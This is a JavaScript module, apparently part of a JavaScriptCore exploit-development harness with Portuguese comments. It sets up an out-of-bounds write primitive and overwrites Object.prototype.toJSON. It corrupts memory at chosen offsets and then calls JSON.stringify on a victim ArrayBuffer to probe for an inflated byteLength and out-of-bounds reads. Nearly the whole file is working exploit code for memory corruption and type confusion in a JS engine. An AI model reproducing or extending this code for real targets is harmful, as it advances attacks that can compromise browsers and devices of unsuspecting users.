// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Contador global, não usado ativamente pela toJSON_AttemptWriteToThis para evitar TypeError
export let current_toJSON_call_count_for_TypeError_test = 0;

// toJSON aprimorada para sondar 'this' (victim_ab) e tentar leitura OOB se o tamanho parecer inflado
export function toJSON_AttemptWriteToThis() {
    // Não usar current_toJSON_call_count_for_TypeError_test++ aqui.
    // Não usar logS3 ou document.title aqui para evitar TypeError conhecido.
    
    const original_victim_ab_size = 64; // Tamanho esperado do victim_ab

    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis_v2",
        this_type: "N/A",
        this_byteLength_prop: "N/A", 
        dataview_created: false,
        internal_write_val: null, // Valor escrito internamente no offset 0
        internal_read_val: null,  // Valor lido de volta do offset 0
        internal_rw_match: false, // Se a escrita/leitura interna funcionou
        error_in_toJSON: null,
        oob_read_offset_attempted: "N/A",
        oob_read_value_attempted: "N/A"
    };

    try {
        result_payload.this_type = Object.prototype.toString.call(this);
        
        try {
            result_payload.this_byteLength_prop = this.byteLength;
        } catch (e_bl) {
            result_payload.this_byteLength_prop = `Error accessing byteLength: ${e_bl.name}`;
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `ByteLength Access Error: ${e_bl.message}; `;
        }

        if (this instanceof ArrayBuffer) {
            let current_this_byteLength = result_payload.this_byteLength_prop;
             // Se o primeiro acesso a byteLength falhou, não podemos prosseguir com DataView
            if (typeof current_this_byteLength !== 'number') {
                result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Cannot proceed, this.byteLength is not a number (val: ${current_this_byteLength}).`;
                return result_payload; // Retorna o payload com o erro
            }

            // Verificação interna de R/W no offset 0
            if (current_this_byteLength >= 4) {
                try {
                    let dv_internal = new DataView(this, 0, Math.min(current_this_byteLength, 8)); // DV para os primeiros bytes
                    result_payload.dataview_created = true; // Pelo menos para a parte interna
                    
                    const val_to_write_internal = 0xABABABAB;
                    dv_internal.setUint32(0, val_to_write_internal, true); 
                    result_payload.internal_write_val = toHex(val_to_write_internal);
                    
                    let read_back_internal = dv_internal.getUint32(0, true);
                    result_payload.internal_read_val = toHex(read_back_internal);
                    
                    if (read_back_internal === val_to_write_internal) {
                        result_payload.internal_rw_match = true;
                    }
                } catch (e_dv_internal) {
                    result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Internal DataView RW Error: ${e_dv_internal.name} - ${e_dv_internal.message}; `;
                }
            } else {
                 result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (ArrayBuffer) too small for internal RW test (size: ${current_this_byteLength}).`;
            }

            // Tentativa de Leitura OOB se o byteLength for MAIOR que o esperado para victim_ab
            if (current_this_byteLength > original_victim_ab_size) {
                result_payload.oob_read_offset_attempted = toHex(original_victim_ab_size + 4); // Ler 4 bytes após o fim original
                try {
                    // Precisamos de uma DataView que possa cobrir o tamanho inflado, se possível
                    let dv_oob = new DataView(this); // Tentar criar DV com o tamanho total percebido
                    if (dv_oob.byteLength >= (original_victim_ab_size + 4 + 4)) { // Checar se a DV pode ler no offset + 4 bytes
                        result_payload.oob_read_value_attempted = toHex(dv_oob.getUint32(original_victim_ab_size + 4, true));
                    } else {
                        result_payload.oob_read_value_attempted = `DataView (size ${dv_oob.byteLength}) too small for OOB read at offset ${result_payload.oob_read_offset_attempted}.`;
                    }
                } catch (e_oob_r) {
                     result_payload.oob_read_value_attempted = `OOB Read Error @${result_payload.oob_read_offset_attempted}: ${e_oob_r.name}`;
                }
            } else {
                 result_payload.oob_read_offset_attempted = toHex(original_victim_ab_size + 4);
                 result_payload.oob_read_value_attempted = `Size not inflated (${current_this_byteLength}b vs ${original_victim_ab_size}b), OOB read not applicable.`;
            }

        } else {
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + "this is not an ArrayBuffer.";
        }
    } catch (e_main) {
        // Captura erros muito genéricos ao tentar operar em 'this'
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `EXCEPTION_IN_toJSON: ${e_main.name} - ${e_main.message}; `;
        if (typeof result_payload.this_byteLength_prop === 'string' && result_payload.this_byteLength_prop.startsWith("Error accessing")) {
            // Mantém o erro específico do byteLength se já ocorreu
        } else {
            result_payload.this_byteLength_prop = `Error during toJSON execution: ${e_main.message}`;
        }
    }
    
    return result_payload;
}

export async function executeFocusedTestForTypeError(
    testDescription,
    toJSONFunctionToUse, 
    valueToWriteOOB,     
    corruptionOffsetToTest 
) {
    const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
    logS3(`--- Iniciando Teste Focado: ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
    document.title = `Iniciando: ${testDescription}`;

    current_toJSON_call_count_for_TypeError_test = 0; 

    const victim_ab_size_val = 64; // victim_ab será sempre de 64 bytes
    const bytes_to_write_oob_val = 4; // Para a corrupção de 0x70
    const ppKey_val = 'toJSON';

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = "OOB OK - " + FNAME;

    let victim_ab = new ArrayBuffer(victim_ab_size_val); // victim_ab é o alvo do stringify
    logS3(`ArrayBuffer victim_ab (${victim_ab_size_val} bytes) criado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true;
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com ${testDescription}...`, "info", FNAME);
        document.title = `Aplicando PP (${testDescription})`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com ${testDescription}.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP OK (${testDescription})`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO (em oob_array_buffer_real): ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_oob_val);
        logS3("Escrita OOB (em oob_array_buffer_real) feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify (victim_ab) (${toHex(corruptionOffsetToTest)})`;
        logS3(`Chamando JSON.stringify(victim_ab) (com ${testDescription})...`, "info", FNAME);
        
        try {
            stringifyResult = JSON.stringify(victim_ab); // Alvo é o victim_ab
            stepReached = `apos_stringify`;
            potentiallyCrashed = false; 
            document.title = `Strfy OK (${testDescription})`;
            logS3(`Resultado JSON.stringify: ${typeof stringifyResult === 'string' ? stringifyResult : JSON.stringify(stringifyResult)}`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy (${e.name}) - ${testDescription}`;
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}.`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR (${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal - " + FNAME;
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main test error:", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}.`, "error", FNAME);
        }
    }
    logS3(`--- Teste Focado Concluído: ${testDescription} ---`, "test", FNAME);
    if (!potentiallyCrashed && !errorCaptured) {
        document.title = `Teste Concluído OK - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO OCORREU (${errorCaptured.name}) - ${testDescription}`;
    }
    return { errorOccurred: errorCaptured, potentiallyCrashed, stringifyResult };
}
